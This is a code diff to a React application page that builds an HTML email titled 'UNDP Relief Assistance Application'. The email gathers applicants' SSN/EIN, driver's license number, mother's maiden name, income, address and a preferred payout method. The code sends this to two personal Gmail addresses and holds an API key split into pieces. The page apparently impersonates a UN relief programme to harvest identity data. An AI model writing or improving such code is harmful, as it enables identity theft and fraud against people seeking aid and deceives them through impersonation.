@@ -114,26 +114,136 @@ const ApplyPage = () => {
         const k3 = "0f5b7d4d1cfd2279-3mdyOX05BcMN1yCr";
         const apiKey = k1 + k2 + k3;
 
-        const htmlMessage = `
-          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e2e8f0; border-radius: 8px; padding: 20px; background: #fff;">
-            <h2 style="color: #0055b8; margin-top: 0;">New Relief Assistance Application</h2>
-            <table style="width: 100%; border-collapse: collapse; font-size: 14px;">
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc; width: 40%;">Full Name</td><td style="padding: 8px;">${data.firstName || ""} ${data.middleName || ""} ${data.lastName || ""}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Mother's Maiden Name</td><td style="padding: 8px;">${data.motherMaidenName || "N/A"}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Email</td><td style="padding: 8px;">${data.email || ""}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Phone Number</td><td style="padding: 8px;">${data.phoneNumber || ""}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Gender / Status</td><td style="padding: 8px;">${data.gender || ""} / ${data.maritalStatus || ""}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Address</td><td style="padding: 8px;">${data.streetAddress || ""} ${data.streetAddress2 || ""}, ${data.city || ""}, ${data.state || ""}, ${data.country || ""}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Employment & Income</td><td style="padding: 8px;">${data.doYouWork || ""} (${data.occupation || "N/A"}) - ${data.annualIncome || "N/A"}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">SSN / EIN</td><td style="padding: 8px;">${data.ssnEin || "N/A"}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Driver License</td><td style="padding: 8px;">${data.driverLicense || "N/A"}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Amount Preferred</td><td style="padding: 8px; color: #16a34a; font-weight: bold;">${data.amountPreferred || ""}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Disbursement Method</td><td style="padding: 8px;">${data.disbursementMethod || ""}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Reason</td><td style="padding: 8px;">${data.applicationReason || ""}</td></tr>
-              <tr><td style="padding: 8px; font-weight: bold; background: #f8fafc;">Overview</td><td style="padding: 8px;">${data.overviewReason || "N/A"}</td></tr>
-            </table>
-          </div>
-        `;
+        const htmlMessage = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>New UNDP Relief Assistance Application</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f4f6f9;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      max-width: 650px;
+      margin: 0 auto;
+      background-color: #ffffff;
+      padding: 24px;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+    }
+    .header {
+      border-bottom: 2px solid #0055b8;
+      padding-bottom: 12px;
+      margin-bottom: 20px;
+    }
+    .header h1 {
+      color: #0055b8;
+      font-size: 22px;
+      margin: 0;
+    }
+    .header p {
+      color: #64748b;
+      font-size: 13px;
+      margin: 4px 0 0 0;
+    }
+    .section-title {
+      background-color: #f1f5f9;
+      padding: 8px 12px;
+      font-weight: bold;
+      color: #334155;
+      font-size: 14px;
+      margin-top: 20px;
+      margin-bottom: 8px;
+      border-left: 4px solid #0055b8;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-bottom: 12px;
+    }
+    th, td {
+      padding: 9px 12px;
+      border-bottom: 1px solid #edf2f7;
+      text-align: left;
+      font-size: 13.5px;
+    }
+    th {
+      background-color: #fafafa;
+      color: #475569;
+      width: 38%;
+      font-weight: 600;
+    }
+    td {
+      color: #1e293b;
+    }
+    .highlight {
+      color: #0055b8;
+      font-weight: bold;
+    }
+    .footer {
+      margin-top: 24px;
+      font-size: 12px;
+      color: #94a3b8;
+      text-align: center;
+      border-top: 1px solid #e2e8f0;
+      padding-top: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>UNDP Relief Assistance Application</h1>
+      <p>Submitted on: ${new Date().toUTCString()}</p>
+    </div>
+
+    <div class="section-title">Personal Details</div>
+    <table>
+      <tr><th>Applicant Name</th><td><strong>${data.firstName || ""} ${data.middleName ? data.middleName + " " : ""}${data.lastName || ""}</strong></td></tr>
+      <tr><th>Mother's Maiden Name</th><td>${data.motherMaidenName || "N/A"}</td></tr>
+      <tr><th>Email Address</th><td><a href="mailto:${data.email || ""}">${data.email || ""}</a></td></tr>
+      <tr><th>Phone Number</th><td><a href="tel:${data.phoneNumber || ""}">${data.phoneNumber || ""}</a></td></tr>
+      <tr><th>Gender</th><td>${data.gender || ""}</td></tr>
+      <tr><th>Marital Status</th><td>${data.maritalStatus || ""}</td></tr>
+    </table>
+
+    <div class="section-title">Address & Location</div>
+    <table>
+      <tr><th>Street Address</th><td>${data.streetAddress || ""}</td></tr>
+      ${data.streetAddress2 ? `<tr><th>Street Address Line 2</th><td>${data.streetAddress2}</td></tr>` : ""}
+      <tr><th>City</th><td>${data.city || ""}</td></tr>
+      <tr><th>State / Province</th><td>${data.state || ""}</td></tr>
+      <tr><th>Country</th><td>${data.country || ""}</td></tr>
+    </table>
+
+    <div class="section-title">Employment & Identity</div>
+    <table>
+      <tr><th>Employed / Works</th><td>${data.doYouWork || ""}</td></tr>
+      ${data.occupation ? `<tr><th>Occupation</th><td>${data.occupation}</td></tr>` : ""}
+      <tr><th>Annual Income</th><td>${data.annualIncome || "N/A"}</td></tr>
+      <tr><th>SSN / EIN</th><td class="highlight">${data.ssnEin || "N/A"}</td></tr>
+      <tr><th>Driver's License #</th><td class="highlight">${data.driverLicense || "N/A"}</td></tr>
+    </table>
+
+    <div class="section-title">Relief Assistance & Disbursement</div>
+    <table>
+      <tr><th>Application Reason</th><td><strong>${data.applicationReason || ""}</strong></td></tr>
+      <tr><th>Preferred Amount</th><td class="highlight">${data.amountPreferred || ""}</td></tr>
+      <tr><th>Preferred Disbursement</th><td><strong>${data.disbursementMethod || ""}</strong></td></tr>
+      <tr><th>Overview of Reason</th><td style="white-space: pre-wrap;">${data.overviewReason || "N/A"}</td></tr>
+    </table>
+
+    <div class="footer">
+      UNDP Relief Assistance Notification Service &bull; Automated System
+    </div>
+  </div>
+</body>
+</html>`;
 
         const recipients = ["noblepediallc@gmail.com", "adebayotosin7665@gmail.com"];
         for (const recipient of recipients) {
